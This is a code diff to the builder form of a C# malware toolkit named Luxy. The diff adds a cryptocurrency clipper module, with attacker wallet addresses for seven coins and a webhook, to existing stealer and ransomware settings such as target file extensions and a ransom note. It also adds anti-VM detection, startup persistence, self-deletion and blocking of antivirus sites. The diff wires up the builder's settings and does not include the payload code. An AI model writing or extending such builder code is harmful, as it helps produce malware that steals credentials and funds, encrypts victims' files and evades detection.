@@ -8,6 +8,7 @@ namespace Luxy
     {
         StealerForm stealerForm = new StealerForm();
         RansomewareForm ransomewareForm = new RansomewareForm();
+        ClipperForm clipperForm = new ClipperForm();
 
         public BuilderForm()
         {
@@ -16,8 +17,10 @@ namespace Luxy
 
         private void build_btn_Click(object sender, EventArgs e)
         {
-            bool[] stealer_settings = stealerForm.Stealer_settings;
-            string[] ransomware_settings = ransomewareForm.Ransomware_settings;
+            var stealer_settings = stealerForm.Stealer_settings;
+            var ransomware_settings_bool = ransomewareForm.Ransomware_settings_bool;
+            var ransomware_settings_string = ransomewareForm.Ransomware_settings_string;
+            var clipper_settings = clipperForm.Clipper_settings;
 
             Settings.StealerModule = stealer_ts.Checked;
             Settings.RansomewareModule = ransomeware_ts.Checked;
@@ -57,9 +60,31 @@ namespace Luxy
             Settings.TakeScreenshot = stealer_settings[9];
 
             Settings.WebhookRansomeware = webhook_ransomware_tb.Text;
-            Settings.EncryptExtension = ransomware_settings[0];
-            Settings.EncryptExtensionList = ransomware_settings[1];
-            Settings.ReadMeMessage = ransomware_settings[2];
+            Settings.EncryptExtension = ransomware_settings_string[0];
+            Settings.EncryptExtensionList = ransomware_settings_string[1];
+            Settings.ReadMeMessage = ransomware_settings_string[2];
+            Settings.ShowReadMeMessage = ransomware_settings_bool[0];
+
+            Settings.WebhookClipper = webhook_clipper_tb.Text;
+            Settings.BtcAddr = clipper_settings["btc"].Item1;
+            Settings.BtcClip = clipper_settings["btc"].Item2;
+            Settings.EthAddr = clipper_settings["eth"].Item1;
+            Settings.EthClip = clipper_settings["eth"].Item2;
+            Settings.DogeAddr = clipper_settings["doge"].Item1;
+            Settings.DogeClip = clipper_settings["doge"].Item2;
+            Settings.LtcAddr = clipper_settings["ltc"].Item1;
+            Settings.LtcClip = clipper_settings["ltc"].Item2;
+            Settings.DashAddr = clipper_settings["dash"].Item1;
+            Settings.DashClip = clipper_settings["dash"].Item2;
+            Settings.XmrAddr = clipper_settings["xmr"].Item1;
+            Settings.XmrClip = clipper_settings["xmr"].Item2;
+            Settings.BchAddr = clipper_settings["bch"].Item1;
+            Settings.BchClip = clipper_settings["bch"].Item2;
+
+            Settings.AntiVm = anti_vm_ts.Checked;
+            Settings.Startup = startup_ts.Checked;
+            Settings.Melt = melt_ts.Checked;
+            Settings.BlockAvSites = block_av_sites_ts.Checked;
 
             Settings.CompanyName = company_tb.Text;
             Settings.Description = description_tb.Text;
@@ -118,6 +143,11 @@ namespace Luxy
                 return;
             }
             icon_path_tb.Text = fileDialog.FileName;
+        }
+
+        private void setting_clipper_btn_Click(object sender, EventArgs e)
+        {
+            clipperForm.ShowDialog();
         }
     }
 }
